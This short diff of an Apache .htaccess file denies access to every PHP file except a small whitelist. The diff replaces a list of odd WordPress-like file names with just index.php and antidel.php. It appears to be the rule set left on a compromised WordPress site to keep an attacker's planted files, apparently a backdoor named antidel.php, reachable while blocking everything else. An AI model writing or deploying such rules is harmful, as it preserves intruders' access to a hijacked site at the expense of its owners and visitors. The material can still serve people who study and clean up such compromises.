@@ -3,9 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|error.php|defines.php|preload.php|site.php|class-wp-block-parser-auth.php|class-wp-blog-format.php|Ipv4.php|InvalidOptions.php|reboot.php|class-wp-application-passwords-list-options.php)$">
+<FilesMatch "^(index.php|antidel.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
-
-DirectoryIndex index.php
